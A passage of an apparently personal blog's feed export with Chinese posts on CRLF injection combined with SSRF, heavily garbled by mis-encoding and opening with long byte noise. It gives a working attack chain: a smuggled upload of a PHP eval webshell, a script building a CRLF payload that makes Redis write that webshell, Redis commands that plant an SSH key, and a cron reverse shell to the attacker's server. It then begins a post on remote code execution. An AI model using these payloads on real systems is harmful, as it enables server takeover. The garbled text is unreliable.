Å´Å¥Å¸Å´Ä¯Å¨Å´Å­Å¬Ä¬Å¡Å°Å°Å¬Å©Å£Å¡Å´Å©Å¯Å®Ä¯Å¸Å¨Å´Å­Å¬Ä«Å¸Å­Å¬Ä¬Å¡Å°Å°Å¬Å©Å£Å¡Å´Å©Å¯Å®Ä¯Å¸Å­Å¬Ä»Å±Ä½Ä°Ä®Ä¹Ä¬Å©Å­Å¡Å§Å¥Ä¯Å¡Å¶Å©Å¦Ä¬Å©Å­Å¡Å§Å¥Ä¯Å·Å¥Å¢Å°Ä¬Å©Å­Å¡Å§Å¥Ä¯Å¡Å°Å®Å§Ä¬ÄªÄ¯ÄªÄ»Å±Ä½Ä°Ä®Ä¸Ä¬Å¡Å°Å°Å¬Å©Å£Å¡Å´Å©Å¯Å®Ä¯Å³Å©Å§Å®Å¥Å¤Ä­Å¥Å¸Å£Å¨Å¡Å®Å§Å¥Ä»Å¶Ä½Å¢Ä³Ä»Å±Ä½Ä°Ä®Ä¹ÄÄŠÅÅ£Å£Å¥Å°Å´Ä­Å…Å®Å£Å¯Å¤Å©Å®Å§ÄºÄ Å§ÅºÅ©Å°Ä¬Ä Å¤Å¥Å¦Å¬Å¡Å´Å¥ÄÄŠÅÅ£Å£Å¥Å°Å´Ä­ÅŒÅ¡Å®Å§ÅµÅ¡Å§Å¥ÄºÄ ÅºÅ¨Ä­ÅƒÅÄ¬ÅºÅ¨Ä»Å±Ä½Ä°Ä®Ä¹ÄÄŠÅƒÅ¯Å¯Å«Å©Å¥ÄºÄ ÅÅˆÅÅ“Å…Å“Å“Å‰Å„Ä½Å®Å«Ä¶Ä·Å¡Å³Å´Å¶Ä¶Ä±Å¨Å±Å¡Å®Å³Å«Å«Å¤Å¤Å³Å¬Å«Å§Å³Å´Ä´ÄÄŠÅƒÅ¯Å®Å®Å¥Å£Å´Å©Å¯Å®ÄºÄ Å£Å¬Å¯Å³Å¥ÄÄŠÄÄŠÄ­Ä­Ä­Ä­Ä­Ä­Å—Å¥Å¢Å‹Å©Å´Å†Å¯Å²Å­Å‚Å¯ÅµÅ®Å¤Å¡Å²Å¹ÅªÅ„Å¢Ä¹ÅˆÅÅ‡Å”Å©Å¸ÅÅÄ·ÅÅ­Ä¶ÄÄŠÅƒÅ¯Å®Å´Å¥Å®Å´Ä­Å„Å©Å³Å°Å¯Å³Å©Å´Å©Å¯Å®ÄºÄ Å¦Å¯Å²Å­Ä­Å¤Å¡Å´Å¡Ä»Ä Å®Å¡Å­Å¥Ä½Ä¢ÅÅÅ˜ÅŸÅ†Å‰ÅŒÅ…ÅŸÅ“Å‰ÅšÅ…Ä¢ÄÄŠÄÄŠÄ±Ä°Ä°Ä°Ä°Ä°ÄÄŠÄ­Ä­Ä­Ä­Ä­Ä­Å—Å¥Å¢Å‹Å©Å´Å†Å¯Å²Å­Å‚Å¯ÅµÅ®Å¤Å¡Å²Å¹ÅªÅ„Å¢Ä¹ÅˆÅÅ‡Å”Å©Å¸ÅÅÄ·ÅÅ­Ä¶ÄÄŠÅƒÅ¯Å®Å´Å¥Å®Å´Ä­Å„Å©Å³Å°Å¯Å³Å©Å´Å©Å¯Å®ÄºÄ Å¦Å¯Å²Å­Ä­Å¤Å¡Å´Å¡Ä»Ä Å®Å¡Å­Å¥Ä½Ä¢ÅµÅ°Å¬Å¯Å¡Å¤Å¥Å¤Ä¢Ä»Ä Å¦Å©Å¬Å¥Å®Å¡Å­Å¥Ä½Ä¢Å³Å¨Å¥Å¬Å¬Ä®Å°Å¨Å°Ä¢ÄÄŠÅƒÅ¯Å®Å´Å¥Å®Å´Ä­Å”Å¹Å°Å¥ÄºÄ Å¡Å°Å°Å¬Å©Å£Å¡Å´Å©Å¯Å®Ä¯Å¯Å£Å´Å¥Å´Ä­Å³Å´Å²Å¥Å¡Å­ÄÄŠÄÄŠÄ¼Ä¿Å°Å¨Å°Ä Å¥Å¶Å¡Å¬Ä¨Ä¤ÅŸÅÅÅ“Å”Å›Ä¢Å·Å¨Å¯Å¡Å­Å©Ä¢ÅÄ©Ä»Ä¿Ä¾ÄÄŠÄ­Ä­Ä­Ä­Ä­Ä­Å—Å¥Å¢Å‹Å©Å´Å†Å¯Å²Å­Å‚Å¯ÅµÅ®Å¤Å¡Å²Å¹ÅªÅ„Å¢Ä¹ÅˆÅÅ‡Å”Å©Å¸ÅÅÄ·ÅÅ­Ä¶ÄÄŠÅƒÅ¯Å®Å´Å¥Å®Å´Ä­Å„Å©Å³Å°Å¯Å³Å©Å´Å©Å¯Å®ÄºÄ Å¦Å¯Å²Å­Ä­Å¤Å¡Å´Å¡Ä»Ä Å®Å¡Å­Å¥Ä½Ä¢Å•Å°Å¬Å¯Å¡Å¤Ä¢ÄÄŠÄÄŠÅ•Å°Å¬Å¯Å¡Å¤ÄÄŠÄ­Ä­Ä­Ä­Ä­Ä­Å—Å¥Å¢Å‹Å©Å´Å†Å¯Å²Å­Å‚Å¯ÅµÅ®Å¤Å¡Å²Å¹ÅªÅ„Å¢Ä¹ÅˆÅÅ‡Å”Å©Å¸ÅÅÄ·ÅÅ­Ä¶Ä­Ä­ÄÄŠÄÄŠÅ‡Å…Å”Ä Ä¯Ä ÅˆÅ”Å”ÅÄ¯Ä±Ä®Ä±ÄÄŠÅ´Å¥Å³Å´Äº</span></code></pre>

<p>æ„é€ è¯·æ±‚ï¼š</p>
<pre><code class="highlight php">&gt; http.<span class="title function_ invoke__">get</span>(<span class="string">&#x27;http://47.101.57.72:4000/Ä ÅˆÅ”Å”ÅÄ¯Ä±Ä®Ä±ÄÄŠÄÄŠÅÅÅ“Å”Ä Ä¯ÅµÅ°Å¬Å¯Å¡Å¤Ä®Å°Å¨Å°Ä ÅˆÅ”Å”ÅÄ¯Ä±Ä®Ä±ÄÄŠÅˆÅ¯Å³Å´ÄºÄ Ä±Ä²Ä·Ä®Ä°Ä®Ä°Ä®Ä±ÄÄŠÅƒÅ¯Å®Å´Å¥Å®Å´Ä­ÅŒÅ¥Å®Å§Å´Å¨ÄºÄ Ä´Ä³Ä·ÄÄŠÅƒÅ¯Å®Å´Å¥Å®Å´Ä­Å”Å¹Å°Å¥ÄºÄ Å­ÅµÅ¬Å´Å©Å°Å¡Å²Å´Ä¯Å¦Å¯Å²Å­Ä­Å¤Å¡Å´Å¡Ä»Ä Å¢Å¯ÅµÅ®Å¤Å¡Å²Å¹Ä½Ä­Ä­Ä­Ä­Å—Å¥Å¢Å‹Å©Å´Å†Å¯Å²Å­Å‚Å¯ÅµÅ®Å¤Å¡Å²Å¹ÅªÅ„Å¢Ä¹ÅˆÅÅ‡Å”Å©Å¸ÅÅÄ·ÅÅ­Ä¶ÄÄŠÅ•Å³Å¥Å²Ä­ÅÅ§Å¥Å®Å´ÄºÄ ÅÅ¯ÅºÅ©Å¬Å¬Å¡Ä¯ÄµÄ®Ä°Ä Ä¨Å—Å©Å®Å¤Å¯Å·Å³Ä ÅÅ”Ä Ä±Ä°Ä®Ä°Ä»Ä Å—Å©Å®Ä¶Ä´Ä»Ä Å¸Ä¶Ä´Ä©Ä ÅÅ°Å°Å¬Å¥Å—Å¥Å¢Å‹Å©Å´Ä¯ÄµÄ³Ä·Ä®Ä³Ä¶Ä Ä¨Å‹ÅˆÅ”ÅÅŒÄ¬Ä Å¬Å©Å«Å¥Ä Å‡Å¥Å£Å«Å¯Ä©Ä ÅƒÅ¨Å²Å¯Å­Å¥Ä¯Ä¹Ä°Ä®Ä°Ä®Ä´Ä´Ä³Ä°Ä®Ä·Ä²Ä Å“Å¡Å¦Å¡Å²Å©Ä¯ÄµÄ³Ä·Ä®Ä³Ä¶ÄÄŠÅÅ£Å£Å¥Å°Å´ÄºÄ Å´Å¥Å¸Å´Ä¯Å¨Å´Å­Å¬Ä¬Å¡Å°Å°Å¬Å©Å£Å¡Å´Å©Å¯Å®Ä¯Å¸Å¨Å´Å­Å¬Ä«Å¸Å­Å¬Ä¬Å¡Å°Å°Å¬Å©Å£Å¡Å´Å©Å¯Å®Ä¯Å¸Å­Å¬Ä»Å±Ä½Ä°Ä®Ä¹Ä¬Å©Å­Å¡Å§Å¥Ä¯Å¡Å¶Å©Å¦Ä¬Å©Å­Å¡Å§Å¥Ä¯Å·Å¥Å¢Å°Ä¬Å©Å­Å¡Å§Å¥Ä¯Å¡Å°Å®Å§Ä¬ÄªÄ¯ÄªÄ»Å±Ä½Ä°Ä®Ä¸Ä¬Å¡Å°Å°Å¬Å©Å£Å¡Å´Å©Å¯Å®Ä¯Å³Å©Å§Å®Å¥Å¤Ä­Å¥Å¸Å£Å¨Å¡Å®Å§Å¥Ä»Å¶Ä½Å¢Ä³Ä»Å±Ä½Ä°Ä®Ä¹ÄÄŠÅÅ£Å£Å¥Å°Å´Ä­Å…Å®Å£Å¯Å¤Å©Å®Å§ÄºÄ Å§ÅºÅ©Å°Ä¬Ä Å¤Å¥Å¦Å¬Å¡Å´Å¥ÄÄŠÅÅ£Å£Å¥Å°Å´Ä­ÅŒÅ¡Å®Å§ÅµÅ¡Å§Å¥ÄºÄ ÅºÅ¨Ä­ÅƒÅÄ¬ÅºÅ¨Ä»Å±Ä½Ä°Ä®Ä¹ÄÄŠÅƒÅ¯Å¯Å«Å©Å¥ÄºÄ ÅÅˆÅÅ“Å…Å“Å“Å‰Å„Ä½Å®Å«Ä¶Ä·Å¡Å³Å´Å¶Ä¶Ä±Å¨Å±Å¡Å®Å³Å«Å«Å¤Å¤Å³Å¬Å«Å§Å³Å´Ä´ÄÄŠÅƒÅ¯Å®Å®Å¥Å£Å´Å©Å¯Å®ÄºÄ Å£Å¬Å¯Å³Å¥ÄÄŠÄÄŠÄ­Ä­Ä­Ä­Ä­Ä­Å—Å¥Å¢Å‹Å©Å´Å†Å¯Å²Å­Å‚Å¯ÅµÅ®Å¤Å¡Å²Å¹ÅªÅ„Å¢Ä¹ÅˆÅÅ‡Å”Å©Å¸ÅÅÄ·ÅÅ­Ä¶ÄÄŠÅƒÅ¯Å®Å´Å¥Å®Å´Ä­Å„Å©Å³Å°Å¯Å³Å©Å´Å©Å¯Å®ÄºÄ Å¦Å¯Å²Å­Ä­Å¤Å¡Å´Å¡Ä»Ä Å®Å¡Å­Å¥Ä½Ä¢ÅÅÅ˜ÅŸÅ†Å‰ÅŒÅ…ÅŸÅ“Å‰ÅšÅ…Ä¢ÄÄŠÄÄŠÄ±Ä°Ä°Ä°Ä°Ä°ÄÄŠÄ­Ä­Ä­Ä­Ä­Ä­Å—Å¥Å¢Å‹Å©Å´Å†Å¯Å²Å­Å‚Å¯ÅµÅ®Å¤Å¡Å²Å¹ÅªÅ„Å¢Ä¹ÅˆÅÅ‡Å”Å©Å¸ÅÅÄ·ÅÅ­Ä¶ÄÄŠÅƒÅ¯Å®Å´Å¥Å®Å´Ä­Å„Å©Å³Å°Å¯Å³Å©Å´Å©Å¯Å®ÄºÄ Å¦Å¯Å²Å­Ä­Å¤Å¡Å´Å¡Ä»Ä Å®Å¡Å­Å¥Ä½Ä¢ÅµÅ°Å¬Å¯Å¡Å¤Å¥Å¤Ä¢Ä»Ä Å¦Å©Å¬Å¥Å®Å¡Å­Å¥Ä½Ä¢Å³Å¨Å¥Å¬Å¬Ä®Å°Å¨Å°Ä¢ÄÄŠÅƒÅ¯Å®Å´Å¥Å®Å´Ä­Å”Å¹Å°Å¥ÄºÄ Å¡Å°Å°Å¬Å©Å£Å¡Å´Å©Å¯Å®Ä¯Å¯Å£Å´Å¥Å´Ä­Å³Å´Å²Å¥Å¡Å­ÄÄŠÄÄŠÄ¼Ä¿Å°Å¨Å°Ä Å¥Å¶Å¡Å¬Ä¨Ä¤ÅŸÅÅÅ“Å”Å›Ä¢Å·Å¨Å¯Å¡Å­Å©Ä¢ÅÄ©Ä»Ä¿Ä¾ÄÄŠÄ­Ä­Ä­Ä­Ä­Ä­Å—Å¥Å¢Å‹Å©Å´Å†Å¯Å²Å­Å‚Å¯ÅµÅ®Å¤Å¡Å²Å¹ÅªÅ„Å¢Ä¹ÅˆÅÅ‡Å”Å©Å¸ÅÅÄ·ÅÅ­Ä¶ÄÄŠÅƒÅ¯Å®Å´Å¥Å®Å´Ä­Å„Å©Å³Å°Å¯Å³Å©Å´Å©Å¯Å®ÄºÄ Å¦Å¯Å²Å­Ä­Å¤Å¡Å´Å¡Ä»Ä Å®Å¡Å­Å¥Ä½Ä¢Å•Å°Å¬Å¯Å¡Å¤Ä¢ÄÄŠÄÄŠÅ•Å°Å¬Å¯Å¡Å¤ÄÄŠÄ­Ä­Ä­Ä­Ä­Ä­Å—Å¥Å¢Å‹Å©Å´Å†Å¯Å²Å­Å‚Å¯ÅµÅ®Å¤Å¡Å²Å¹ÅªÅ„Å¢Ä¹ÅˆÅÅ‡Å”Å©Å¸ÅÅÄ·ÅÅ­Ä¶Ä­Ä­ÄÄŠÄÄŠÅ‡Å…Å”Ä Ä¯Ä ÅˆÅ”Å”ÅÄ¯Ä±Ä®Ä±ÄÄŠÅ´Å¥Å³Å´Äº&#x27;</span>)</code></pre>

<p><img src="https://p0.ssl.qhimg.com/t01aac9eb365660564a.png" alt="img"></p>
<p>å¦‚ä¸Šå›¾æ‰€ç¤ºï¼ŒæˆåŠŸæ„é€ å‡ºäº†ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ çš„POSTè¯·æ±‚ï¼Œåƒè¿™æ ·çš„POSTè¯·æ±‚å¯ä»¥è¢«æˆ‘ä»¬ç”¨äº SSRFã€‚ä¸‹é¢æˆ‘ä»¬åˆ†æä¸€ä¸‹æ•´ä¸ªæ”»å‡»çš„è¿‡ç¨‹ã€‚</p>
<p>åŸå§‹è¯·æ±‚æ•°æ®å¦‚ä¸‹ï¼š</p>
<pre><code class="highlight http"><span class="keyword">GET</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span>
<span class="attribute">Host</span><span class="punctuation">: </span>47.101.57.72:4000</code></pre>

<p>å½“æˆ‘ä»¬æ’å…¥CRLFæ•°æ®åï¼ŒHTTPè¯·æ±‚æ•°æ®å˜æˆäº†ï¼š</p>
<pre><code class="highlight http"><span class="keyword">GET</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span>

<span class="language-php">POST /upload.php HTTP/<span class="number">1.1</span></span>
<span class="language-php">Host: <span class="number">127.0</span>.<span class="number">0.1</span></span>
<span class="language-php">Content-Length: <span class="number">437</span></span>
<span class="language-php">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryjDb9HMGTixAA7Am6</span>
<span class="language-php">......</span>
<span class="language-php"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;whoami&quot;</span>]);<span class="meta">?&gt;</span></span>
<span class="language-php">------WebKitFormBoundaryjDb9HMGTixAA7Am6</span>
<span class="language-php">Content-Disposition: form-data; name=<span class="string">&quot;Upload&quot;</span></span>
<span class="language-php"></span>
<span class="language-php">Upload</span>
<span class="language-php">------WebKitFormBoundaryjDb9HMGTixAA7Am6--</span>
<span class="language-php"></span>
<span class="language-php"> HTTP/<span class="number">1.1</span></span>
<span class="language-php">Host: <span class="number">47.101</span>.<span class="number">57.72</span>:<span class="number">4000</span></span></code></pre>

<p>ä¸Šæ¬¡è¯·æ±‚åŒ…çš„Hostå­—æ®µå’ŒçŠ¶æ€è¡Œä¸­çš„ <code>HTTP/1.1</code> å°±å•ç‹¬å‡ºæ¥äº†ï¼Œæ‰€ä»¥æˆ‘ä»¬å†æ„é€ ä¸€ä¸ªè¯·æ±‚æŠŠä»–é—­åˆï¼š</p>
<pre><code class="highlight http"><span class="keyword">GET</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span>

<span class="language-php">POST /upload.php HTTP/<span class="number">1.1</span></span>
<span class="language-php">Host: <span class="number">127.0</span>.<span class="number">0.1</span></span>
<span class="language-php">Content-Length: <span class="number">437</span></span>
<span class="language-php">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryjDb9HMGTixAA7Am6</span>
<span class="language-php">......</span>
<span class="language-php"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;whoami&quot;</span>]);<span class="meta">?&gt;</span></span>
<span class="language-php">------WebKitFormBoundaryjDb9HMGTixAA7Am6</span>
<span class="language-php">Content-Disposition: form-data; name=<span class="string">&quot;Upload&quot;</span></span>
<span class="language-php"></span>
<span class="language-php">Upload</span>
<span class="language-php">------WebKitFormBoundaryjDb9HMGTixAA7Am6--</span>
<span class="language-php"></span>
<span class="language-php">GET / HTTP/<span class="number">1.1</span></span>
<span class="language-php">test: HTTP/<span class="number">1.1</span></span>
<span class="language-php">Host: <span class="number">47.101</span>.<span class="number">57.72</span>:<span class="number">4000</span></span></code></pre>

<h2 id="CRLF-SSRF-æ”»å‡»å†…ç½‘åº”ç”¨"><a href="#CRLF-SSRF-æ”»å‡»å†…ç½‘åº”ç”¨" class="headerlink" title="CRLF + SSRF æ”»å‡»å†…ç½‘åº”ç”¨"></a>CRLF + SSRF æ”»å‡»å†…ç½‘åº”ç”¨</h2><p>åœ¨SSRFä¸­æˆ‘ä»¬ç»å¸¸ä½¿ç”¨ Gopher åè®®å»æ”»å‡»å†…ç½‘åº”ç”¨ï¼Œæ¯”å¦‚Redisã€MySQLã€FTPç­‰ã€‚ä½†æ˜¯å½“ Gopher åè®®è¢«è¿‡æ»¤äº†ä¹‹åï¼Œæˆ‘ä»¬è¿˜å¯ä»¥é€šè¿‡HTTPåè®®å¹¶é…åˆCRLFæ¼æ´è¿›è¡Œæ”»å‡»ï¼Œè¾¾åˆ°ä¸ Gopher åè®®ä¸€æ ·çš„æ•ˆæœã€‚</p>
<h3 id="æ”»å‡»-Redis"><a href="#æ”»å‡»-Redis" class="headerlink" title="æ”»å‡» Redis"></a>æ”»å‡» Redis</h3><p>å®éªŒç¯å¢ƒï¼š</p>
<p><img src="https://p3.ssl.qhimg.com/t0131e105fae41b3683.png" alt="img"></p>
<p>è®¿é—®ç›®æ ‡WebæœåŠ¡å™¨æ˜¯ä¸€ä¸ªFlaskåº”ç”¨ï¼Œå¯ä»¥é€šè¿‡ä¼ é€’urlå‚æ•°è¿›è¡Œ SSRFï¼š</p>
<p><img src="https://p3.ssl.qhimg.com/t010ad518fe0047f40f.png" alt="img"></p>
<p>ç»æµ‹è¯•ï¼Œç›®æ ‡ä¸»æœº6379ç«¯å£ä¸Šè¿è¡Œæœ‰RedisæœåŠ¡ä¸”åªèƒ½åœ¨æœ¬åœ°è®¿é—®ï¼Œä½†æ˜¯ç›®æ ‡æœåŠ¡å™¨è¿‡æ»¤äº† Gopher åè®®ï¼Œè¦æƒ³æ”»å‡» Redis çš„è¯è¿˜éœ€è¦æƒ³åˆ«çš„åŠæ³•ã€‚</p>
<p>é¦–å…ˆè®©ç›®æ ‡æœºè®¿é—®æˆ‘ä»¬çš„ VPSï¼š</p>
<pre><code class="highlight python">/?url=http://<span class="number">47.101</span><span class="number">.57</span><span class="number">.72</span>:<span class="number">4000</span></code></pre>

<p><img src="https://p4.ssl.qhimg.com/t01de6686f7292b3fcb.png" alt="img"></p>
<p>å¦‚ä¸Šå›¾æ‰€ç¤ºï¼Œå‘ç°ç›®æ ‡Webå­˜åœ¨Python-urllib&#x2F;3.7ï¼Œè¯¥ç‰ˆæœ¬çš„Urllibå­˜åœ¨CRLFæ³¨å…¥æ¼æ´ï¼Œæ‰€ä»¥æˆ‘ä»¬çš„æ€è·¯æ˜¯é€šè¿‡HTTPåè®®é…åˆCRLFæ¼æ´æ”»å‡»Redisã€‚</p>
<p>è¿™é‡Œæˆ‘ä»¬åªæ¼”ç¤ºé€šè¿‡ Redis å†™ Webshellï¼Œéœ€è¦æ‰§è¡Œçš„ Redis å‘½ä»¤å¦‚ä¸‹ï¼š</p>
<pre><code class="highlight python">flushall
config <span class="built_in">set</span> <span class="built_in">dir</span> /var/www/html/
config <span class="built_in">set</span> dbfilename shell.php
<span class="built_in">set</span> x <span class="string">&#x27;&lt;?php eval($_POST[whoami]);?&gt;&#x27;</span>
save</code></pre>

<p>ç„¶åè¦åšçš„å°±æ˜¯ä½¿ç”¨ HTTP åè®®é…åˆ CRLF å°†è¿™äº›å‘½ä»¤æ„é€ æˆ TCP Stream å¹¶é€šè¿‡ SSRF å‘é€ç»™ç›®æ ‡æœåŠ¡å™¨ã€‚</p>
<p>ç¼–å†™è„šæœ¬æ„é€  payloadï¼š</p>
<pre><code class="highlight python"><span class="keyword">import</span> urllib.parse

payload = <span class="string">&#x27;&#x27;&#x27; HTTP/1.1</span>
<span class="string"></span>
<span class="string">flushall</span>
<span class="string">config set dir /var/www/html/</span>
<span class="string">config set dbfilename shell.php</span>
<span class="string">set x &#x27;&lt;?php eval($_POST[whoami]);?&gt;&#x27;</span>
<span class="string">save</span>
<span class="string">test: &#x27;&#x27;&#x27;</span>
payload = urllib.parse.quote(payload).replace(<span class="string">&quot;%0A&quot;</span>, <span class="string">&quot;%0D%0A&quot;</span>)
payload = <span class="string">&quot;?url=http://127.0.0.1:6379/&quot;</span> + payload
<span class="built_in">print</span>(payload)

<span class="comment"># è¾“å‡º: ?url=http://127.0.0.1:6379/%20HTTP/1.1%0D%0A%0D%0Aflushall%0D%0Aconfig%20set%20dir%20/var/www/html/%0D%0Aconfig%20set%20dbfilename%20shell.php%0D%0Aset%20x%20%27%3C%3Fphp%20eval%28%24_POST%5Bwhoami%5D%29%3B%3F%3E%27%0D%0Asave%0D%0Atest%3A%20</span></code></pre>

<p>æˆ‘ä»¬ç°åœ¨è‡ªå·± VPS ä¸Šæµ‹è¯•ä¸€ä¸‹ï¼š</p>
<pre><code class="highlight python">?url=http://<span class="number">47.101</span><span class="number">.57</span><span class="number">.72</span>:<span class="number">6379</span>/%20HTTP/<span class="number">1.1</span>%0D%0A%0D%0Aflushall%0D%0Aconfig%20<span class="built_in">set</span>%20<span class="built_in">dir</span>%<span class="number">20</span>/var/www/html/%0D%0Aconfig%20<span class="built_in">set</span>%20dbfilename%20shell.php%0D%0Aset%20x%<span class="number">20</span>%<span class="number">27</span>%3C%3Fphp%20<span class="built_in">eval</span>%<span class="number">28</span>%24_POST%5Bwhoami%5D%<span class="number">29</span>%3B%3F%3E%<span class="number">27</span>%0D%0Asave%0D%0Atest%3A%<span class="number">20</span></code></pre>

<p><img src="https://p5.ssl.qhimg.com/t012736c55bfe08049f.png" alt="img"></p>
<p>å¦‚ä¸Šå›¾æ‰€ç¤ºï¼ŒæˆåŠŸå‘é€å‡ºäº† Redis å‘½ä»¤ã€‚ä¸‹é¢å¼€å§‹æ­£å¼æ”»å‡»ï¼š</p>
<pre><code class="highlight python">/?url=http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">6379</span>/%20HTTP/<span class="number">1.1</span>%0D%0Aflushall%0D%0Aconfig%20<span class="built_in">set</span>%20<span class="built_in">dir</span>%<span class="number">20</span>/var/www/html/%0D%0Aconfig%20<span class="built_in">set</span>%20dbfilename%20shell.php%0D%0Aset%20x%<span class="number">20</span>%<span class="number">27</span>%3C%3Fphp%20<span class="built_in">eval</span>%<span class="number">28</span>%24_POST%5Bwhoami%5D%<span class="number">29</span>%3B%3F%3E%<span class="number">27</span>%0D%0Asave%0D%0Atest%3A%<span class="number">20</span></code></pre>

<p>æ‰§è¡Œåï¼ŒæˆåŠŸé€šè¿‡Redisåœ¨ç›®æ ‡ä¸»æœºçš„Webç›®å½•é‡Œé¢å†™å…¥äº†Webshellï¼š</p>
<p><img src="https://p0.ssl.qhimg.com/t01a5cac758fd4e71af.png" alt="img"></p>
<p>èšå‰‘è¿æ¥æˆåŠŸï¼š</p>
<p><img src="https://p2.ssl.qhimg.com/t016508ddd55f7008c4.png" alt="img"></p>
<p>è¿˜å¯ä»¥é€šè¿‡ Redis å†™å…¥ SSH ç§˜é’¥å’Œåˆ›å»ºè®¡åˆ’ä»»åŠ¡ï¼Œç›¸åº”çš„ Redis å‘½ä»¤å¦‚ä¸‹ã€‚</p>
<ul>
<li>å†™å…¥ SSH ç§˜é’¥ï¼š</li>
</ul>
<pre><code class="highlight python">flushall
<span class="built_in">set</span> <span class="number">1</span> <span class="string">&#x27;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDrCwrA1zAhmjeG6E/45IEs/9a6AWfXb6iwzo+D62y8MOmt+sct27ZxGOcRR95FT6zrfFxqt2h56oLwml/Trxy5sExSQ/cvvLwUTWb3ntJYyh2eGkQnOf2d+ax2CVF8S6hn2Z0asAGnP3P4wCJlyR7BBTaka9QNH/4xsFDCfambjmYzbx9O2fzl8F67jsTq8BVZxy5XvSsoHdCtr7vxqFUd/bWcrZ5F1pEQ8tnEBYsyfMK0NuMnxBdquNVSlyQ/NnHKyWtI/OzzyfvtAGO6vf3dFSJlxwZ0aC15GOwJhjTpTMKq9jrRdGdkIrxLKe+XqQnjxtk4giopiFfRu8winE9scqlIA5Iu/d3O454ZkYDMud7zRkSI17lP5rq3A1f5xZbTRUlxpa3Pcuolg/OOhoA3iKNhJ/JT31TU9E24dGh2Ei8K+PpT92dUnFDcmbEfBBQz7llHUUBxedy44Yl+SOsVHpNqwFcrgsq/WR5BGqnu54vTTdJh0pSrl+tniHEnWWU= root@whoami</span>
<span class="string">&#x27;</span>
config <span class="built_in">set</span> <span class="built_in">dir</span> /root/.ssh/
config <span class="built_in">set</span> dbfilename authorized_keys
save</code></pre>

<ul>
<li>åˆ›å»ºè®¡åˆ’ä»»åŠ¡</li>
</ul>
<pre><code class="highlight python">flushall
<span class="built_in">set</span> <span class="number">1</span> <span class="string">&#x27;\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/47.xxx.xxx.72/2333 0&gt;&amp;1\n\n&#x27;</span>
config <span class="built_in">set</span> <span class="built_in">dir</span> /var/spool/cron/
config <span class="built_in">set</span> dbfilename root
save

// <span class="number">47.</span>xxx.xxx<span class="number">.72</span>ä¸ºæ”»å‡»è€…vpsçš„IP</code></pre>

<p>æ„é€  payload çš„æ–¹æ³•ä¸å†™ Webshell çš„æ–¹æ³•æ˜¯ä¸€æ ·çš„ï¼Œè¯·è‡ªè¡Œå°è¯•ã€‚</p>
<h3 id="æ”»å‡»-MySQL"><a href="#æ”»å‡»-MySQL" class="headerlink" title="æ”»å‡» MySQL"></a>æ”»å‡» MySQL</h3><p>å‘ã€‚ã€‚ã€‚</p>
<h3 id="æ”»å‡»FTP"><a href="#æ”»å‡»FTP" class="headerlink" title="æ”»å‡»FTP"></a>æ”»å‡»FTP</h3><p>é‰´äºæˆ‘è¿˜æ²¡æ¥è§¦è¿‡FTPï¼Œå…ˆæç½®äº†ã€‚ã€‚</p>
<p>æ„Ÿè§‰æœ€è¿‘æ¥è§¦åˆ°çš„å¯¹äºHTTPæŠ¥æ–‡çš„æ¼æ´è¶Šæ¥è¶Šå¤šäº†ï¼Œæ„Ÿè§‰éœ€è¦é‡æ–°å¥½å¥½äº†è§£ä¸€ä¸‹HTTPåè®®äº†(ä¹‹å‰åªæ˜¯ä¸ºäº†åšé¢˜ï¼Œåœ¨å…¥é—¨çš„æ—¶å€™ä»æ¥æ²¡æœ‰æ€è€ƒè¿‡å»æ·±å…¥äº†è§£HTTPåè®®å†…éƒ¨çš„æœºåˆ¶ã€‚ã€‚</p>
<p>æœ€åå†æ„Ÿæ¦‚ä¸€å¥ï¼ŒCRLFçš„é»„é‡‘æ—¥å­å·²ç»è¿‡å»äº†å”‰å”‰ï¼Œç°åœ¨åªèƒ½åœ¨å…¶ä»–æ”»å‡»é‡Œé¢çœ‹åˆ°å®ƒçš„å½±å­ï¼Œè¿™ç®—ä¸ç®—ä¸€ç§æ—¶ä»£çš„çœ¼æ³ªå‘¢ã€‚ã€‚</p>
]]></content>
      <tags>
        <tag>-Web -HTTP</tag>
      </tags>
  </entry>
  <entry>
    <title>RCE</title>
    <url>/2025/01/21/RCE/</url>
    <content><![CDATA[<h1 id="RCEï¼ˆè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼‰åŸç†åŠæ¼æ´ç›¸å…³"><a href="#RCEï¼ˆè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼‰åŸç†åŠæ¼æ´ç›¸å…³" class="headerlink" title="RCEï¼ˆè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼‰åŸç†åŠæ¼æ´ç›¸å…³"></a>RCEï¼ˆè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼‰åŸç†åŠæ¼æ´ç›¸å…³</h1><p>RCEï¼ŒRomote Code Executionæ¼æ´ï¼Œå³é€šè¿‡å‘åå°æœåŠ¡å™¨è¿œç¨‹æ³¨å…¥ç³»ç»Ÿå‘½ä»¤æˆ–ä»£ç æ¥æ§åˆ¶åå°ç³»ç»Ÿ</p>
<p><strong>ç³»ç»Ÿå‘½ä»¤æ‰§è¡Œå‡½æ•°</strong></p>
<pre><code class="highlight plaintext">*** system() è¯­æ³•ä¸ºsystem(string $command, int &amp;$return var = ?)
*** passthru() system()çš„å¹³æ›¿ï¼Œå†™ä¸ªå‘½ä»¤å°±ä¼šæ‰§è¡Œå‘½ä»¤ï¼Œè‡ªå·±èƒ½å›æ˜¾
*** exec() ç¤ºä¾‹exec(&quot;cat /flag&quot;)ï¼Œå…¶æœ¬èº«æ²¡æœ‰å›æ˜¾
*** shell_exec() æ ¼å¼åˆ†åˆ«ä¸ºshell_execï¼ˆlsï¼‰å’Œ`ls`,ä¸èƒ½è‡ªå·±å›æ˜¾ï¼Œéœ€è¦å€Ÿç”¨echo\printç­‰è¾“å‡ºç»“æœ
